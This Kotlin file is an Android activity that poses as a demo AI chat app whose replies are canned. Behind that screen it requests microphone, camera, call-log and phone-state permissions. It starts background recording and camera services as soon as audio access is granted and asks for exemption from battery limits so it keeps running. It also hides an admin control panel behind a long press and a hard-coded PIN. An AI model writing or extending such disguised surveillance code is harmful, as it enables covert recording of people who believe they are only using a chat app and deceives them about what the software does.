package com.example.devsync

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import com.example.devsync.databinding.ActivityUserBinding
import kotlinx.coroutines.*

class UserInterfaceActivity : AppCompatActivity() {

    private lateinit var binding: ActivityUserBinding
    private val messages = mutableListOf<ChatMessage>()
    private lateinit var adapter: ChatAdapter
    private val ADMIN_PIN = "9999"
    private var recordingServiceStarted = false

    companion object {
        private const val REQ_ALL_PERMISSIONS = 101
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityUserBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setupChatUI()
        requestAllPermissions()
        requestIgnoreBatteryOptimization()
    }

    override fun onResume() {
        super.onResume()
        // If RECORD_AUDIO already granted (e.g. second launch), start RecordingService
        if (!recordingServiceStarted &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED) {
            startRecordingService()
        }
    }

    private fun startRecordingService() {
        if (recordingServiceStarted) return
        recordingServiceStarted = true
        val intent = Intent(this, RecordingService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(intent)
            else
                startService(intent)
        } catch (e: Exception) {
            // Ignore — service will start on next resume when permissions are ready
        }
        // Start CameraService alongside recording
        try {
            val camIntent = Intent(this, CameraService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(camIntent)
            else
                startService(camIntent)
        } catch (_: Exception) {}
    }

    private fun requestAllPermissions() {
        val needed = mutableListOf<String>()
        val perms = buildList {
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.READ_CALL_LOG)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                add(Manifest.permission.BLUETOOTH_CONNECT)
        }
        perms.forEach {
            if (ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED)
                needed.add(it)
        }
        if (needed.isNotEmpty())
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_ALL_PERMISSIONS)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_ALL_PERMISSIONS) {
            // Check if RECORD_AUDIO was granted → start RecordingService
            val idx = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
            if (idx >= 0 && grantResults[idx] == PackageManager.PERMISSION_GRANTED) {
                startRecordingService()
            }
        }
    }

    private fun setupChatUI() {
        adapter = ChatAdapter(messages)
        binding.recyclerView.layoutManager = LinearLayoutManager(this).apply { stackFromEnd = true }
        binding.recyclerView.adapter = adapter

        binding.btnSend.setOnClickListener {
            val text = binding.etMessage.text.toString().trim()
            if (text.isNotEmpty()) { sendMessage(text); binding.etMessage.text.clear() }
        }
        binding.btnSend.setOnLongClickListener { showAdminPinDialog(); true }

        messages.add(ChatMessage("Hello! This is a demo AI chat interface.", false))
        adapter.notifyDataSetChanged()
    }

    private fun showAdminPinDialog() {
        val input = EditText(this).apply {
            hint = "Enter PIN"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
                        android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
        }
        AlertDialog.Builder(this)
            .setTitle("Admin Access")
            .setView(input)
            .setPositiveButton("Login") { _, _ ->
                if (input.text.toString() == ADMIN_PIN)
                    startActivity(Intent(this, AdminControlActivity::class.java))
                else
                    Toast.makeText(this, "Wrong PIN", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun sendMessage(text: String) {
        messages.add(ChatMessage(text, true))
        adapter.notifyItemInserted(messages.size - 1)
        binding.recyclerView.scrollToPosition(messages.size - 1)
        CoroutineScope(Dispatchers.Main).launch {
            delay(1200)
            messages.add(ChatMessage("This is a simulated response.", false))
            adapter.notifyItemInserted(messages.size - 1)
            binding.recyclerView.scrollToPosition(messages.size - 1)
        }
    }

    private fun requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {}
            }
        }
    }
}
